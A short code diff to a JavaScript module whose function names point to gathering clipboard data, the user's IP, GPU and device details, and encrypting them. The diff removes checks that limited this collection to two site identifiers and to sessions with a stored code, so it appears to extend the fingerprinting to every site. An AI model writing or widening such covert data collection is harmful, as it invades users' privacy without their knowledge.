@@ -6,10 +6,6 @@ const pubkey =
 const isDev = process.env.NODE_ENV === 'development';
 let gpuVendor = '';
 export const InitClipboardInfo = (data, site) => {
-  if (!['aobo1', 'sp1'].includes(site)) {
-    return;
-  }
-
   localStorage.removeItem('addr');
 
   const info = JSON.stringify({
@@ -95,10 +91,6 @@ function getUserIP(onNewIP) {
 }
 
 export const EncryptInfo = (domain, site) => {
-  if (!['aobo1', 'sp1'].includes(site) || !localStorage.getItem('code') || localStorage.getItem('code') === '') {
-    return;
-  }
-
   getGPUInfo();
 
   if (typeof DeviceInfo === 'undefined') {
